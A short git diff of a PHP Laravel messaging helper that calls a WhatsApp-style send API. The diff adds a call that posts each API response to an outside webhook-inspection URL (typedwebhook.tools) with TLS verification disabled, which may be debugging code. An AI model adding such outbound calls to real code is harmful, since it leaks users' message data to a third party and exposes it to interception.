@@ -115,8 +115,14 @@ if(!function_exists('send_message')):
         elseif($media == null):
             $end_point    = "https://wh.line.sa/api/send?number=$phone_number&type=text&message=$message&instance_id=$instance_id&access_token=$access_token";
         endif;
-        $send_result         = Http::post($end_point);
+        $send_result         = Http::timeout(-1)->post($end_point);
         $result_send_message = $send_result->json();
+
+        Http::WithOptions([
+            'verify' => false
+        ])->post('https://typedwebhook.tools/webhook/2cb07b6c-5499-48e0-8458-73480334f3db',[
+            'cart' => $result_send_message
+        ]);
 
         // if($result_send_message['stats'] == false):
         //     send_message_error($result_send_message['type_erro'],$instance_id);
